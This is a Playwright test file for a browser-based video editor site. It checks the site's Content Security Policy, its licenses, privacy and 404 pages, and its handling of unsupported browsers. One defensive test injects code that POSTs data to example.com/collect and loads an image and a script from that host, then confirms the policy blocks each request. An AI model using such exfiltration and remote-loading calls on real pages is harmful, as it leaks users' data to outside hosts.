import { expect, type Page, test } from '@playwright/test'
import { audio, clearHistory, exportVideo, media, pick, positionMs, WEBKIT_CANNOT } from './helpers'

const ORIGIN = 'http://localhost:4173'

/** What the page's security policy turned away, recorded from the page's own reports. */
async function watchViolations(page: Page): Promise<void> {
  await page.addInitScript(() => {
    ;(window as unknown as { violations: string[] }).violations = []
    document.addEventListener('securitypolicyviolation', (event) => {
      ;(window as unknown as { violations: string[] }).violations.push(`${event.violatedDirective} ${event.blockedURI}`)
    })
  })
}

const violations = (page: Page): Promise<string[]> => page.evaluate(() => (window as unknown as { violations: string[] }).violations)

test.describe('the pages', () => {
  test('every page carries a security policy, and the static ones have no script at all', async ({ request }) => {
    const app = await (await request.get('/')).text()
    expect(app).toMatch(/http-equiv="Content-Security-Policy"/)
    expect(app).toContain("connect-src 'self' blob:")
    expect(app).toContain("default-src 'none'")
    for (const path of ['/privacy/', '/licenses/', '/404.html']) {
      const html = await (await request.get(path)).text()
      expect(html, path).toContain("default-src 'none'")
      expect(html, path).not.toContain('<script')
    }
  })

  test('the licenses page names every component with its license, and the source of the one under the Mozilla license', async ({ page }) => {
    await page.goto('/licenses/')
    await expect(page.getByRole('heading', { level: 1 })).toHaveText('Licenses and notices')
    await expect(page.getByRole('heading', { name: /^mediabunny \d/ })).toBeVisible()
    await expect(page.getByRole('heading', { name: /^preact \d/ })).toBeVisible()
    await expect(page.getByRole('heading', { name: /^@mediabunny\/aac-encoder \d/ })).toBeVisible()
    await expect(page.getByRole('heading', { name: /^ffmpeg-libavcodec \d/ })).toBeVisible()
    await expect(page.locator('#ffmpeg-libavcodec pre')).toContainText('GNU LESSER GENERAL PUBLIC LICENSE')
    await expect(page.locator('#ffmpeg-libavcodec')).toContainText('so that it can be replaced by another build of the library')
    await expect(page.locator('#mediabunny pre')).toContainText('Mozilla Public License Version 2.0')
    await expect(page.locator('#mediabunny a[href^="https://github.com/Vanilagy/mediabunny/tree/v"]').first()).toBeVisible()
    await expect(page.locator('#preact pre')).toContainText('The MIT License')
    // What the site is derived from keeps its license with it.
    await expect(page.locator('main')).toContainText('CutRoom')
    await expect(page.locator('main')).toContainText('Permission is hereby granted, free of charge')
  })

  test('the policy covers the web version in all three languages', async ({ page }) => {
    await page.goto('/privacy/')
    await expect(page.locator('#en')).toContainText('The web version.')
    await expect(page.locator('#en')).toContainText('GitHub Pages')
    await expect(page.locator('#he')).toContainText('הגרסה באינטרנט')
    await expect(page.locator('#ar')).toContainText('النسخة على الويب')
    // The notes for the owner are not on the public page.
    await expect(page.locator('main')).not.toContainText('Draft for review')
  })

  test('the site links its policy and its licenses, and has an icon', async ({ page }) => {
    await page.goto('/')
    const footer = page.locator('footer.site')
    await expect(footer.getByRole('link', { name: 'Privacy policy' })).toHaveAttribute('href', '/privacy/')
    await expect(footer.getByRole('link', { name: 'Licenses' })).toHaveAttribute('href', '/licenses/')
    await expect(page.locator('link[rel=icon]')).toHaveAttribute('href', '/favicon.svg')
    await page.getByRole('button', { name: 'עברית' }).click()
    await expect(footer.getByRole('link', { name: 'רישיונות' })).toBeVisible()
  })

  test('an unknown address gets a page of the site, in three languages, with a way back', async ({ request }) => {
    const html = await (await request.get('/404.html')).text()
    expect(html).toContain('That page does not exist')
    expect(html).toContain('הדף הזה אינו קיים')
    expect(html).toContain('هذه الصفحة غير موجودة')
    expect(html).toContain('href="/"')
    expect((await request.get('/favicon.svg')).ok()).toBe(true)
  })
})

test.describe('the security policy', () => {
  test('is kept through a whole piece of work, and nothing leaves the page', async ({ page, browserName }) => {
    test.skip(browserName === 'webkit', WEBKIT_CANNOT.encode)
    test.setTimeout(120_000)
    await watchViolations(page)
    const outside: string[] = []
    page.on('request', (request) => {
      const url = request.url()
      if (!url.startsWith(ORIGIN) && !url.startsWith('blob:') && !url.startsWith('data:')) outside.push(url)
    })
    const errors: string[] = []
    page.on('console', (message) => {
      if (message.type() === 'error' || message.type() === 'warning') errors.push(message.text())
    })

    await page.goto('/')
    await pick(page, [media('landscape.webm'), media('silent.webm')])
    await expect(page.locator('.timeline .clip')).toHaveCount(2)
    await clearHistory(page)
    // Pictures, text, music, a recording, playing and an export: everything the site does.
    await page.getByTestId('add-text').click()
    await page.getByTestId('text-field').fill('Under a policy')
    await page.getByTestId('text-save').click()
    const chooser = page.waitForEvent('filechooser')
    await page.getByTestId('add-music').click()
    await (await chooser).setFiles(audio('tone.wav'))
    await expect(page.locator('.timeline .audio-bar')).toHaveCount(1)
    await page.getByTestId('play').click()
    await expect.poll(() => positionMs(page)).toBeGreaterThan(300)
    await page.getByTestId('play').click()
    const exported = await exportVideo(page)
    expect(exported.fileName).toMatch(/^landscape-/)
    await page.getByTestId('export-close').click()
    await page.getByRole('link', { name: /Projects/ }).click()
    await expect(page.locator('li.project')).toHaveCount(1)

    expect(await violations(page)).toEqual([])
    expect(outside).toEqual([])
    expect(errors.filter((text) => /content security policy|refused to/i.test(text))).toEqual([])
  })

  test('turns away a script that tries to send something to another site, or to load from one', async ({ page }) => {
    await watchViolations(page)
    await page.goto('/')
    const outcome = await page.evaluate(async () => {
      const sent = await fetch('https://example.com/collect', { method: 'POST', body: 'a video' }).then(() => 'sent', () => 'blocked')
      const image = await new Promise<string>((resolve) => {
        const picture = new Image()
        picture.onload = () => resolve('loaded')
        picture.onerror = () => resolve('blocked')
        picture.src = 'https://example.com/pixel.png'
      })
      const script = await new Promise<string>((resolve) => {
        const element = document.createElement('script')
        element.onload = () => resolve('loaded')
        element.onerror = () => resolve('blocked')
        element.src = 'https://example.com/x.js'
        document.head.append(element)
      })
      return { sent, image, script }
    })
    expect(outcome).toEqual({ sent: 'blocked', image: 'blocked', script: 'blocked' })
    const reported = await violations(page)
    expect(reported.some((entry) => entry.startsWith('connect-src'))).toBe(true)
    expect(reported.some((entry) => entry.startsWith('img-src'))).toBe(true)
    expect(reported.some((entry) => entry.startsWith('script-src'))).toBe(true)
  })
})

test.describe('a browser that lacks what the editor needs', () => {
  test('is told so, and nothing half-works', async ({ page }) => {
    await page.addInitScript(() => {
      Object.defineProperty(window, 'VideoEncoder', { value: undefined, configurable: true })
    })
    await page.goto('/')
    const message = page.locator('[data-blocked=browser]')
    await expect(message).toContainText('cannot edit video on this site')
    await expect(message).toContainText('Chrome, Edge, Firefox or Safari')
    await expect(page.getByTestId('video-input')).toHaveCount(0)
    await page.getByRole('button', { name: 'עברית' }).click()
    await expect(message).toContainText('אינו מתאים לעריכת וידאו')
  })
})
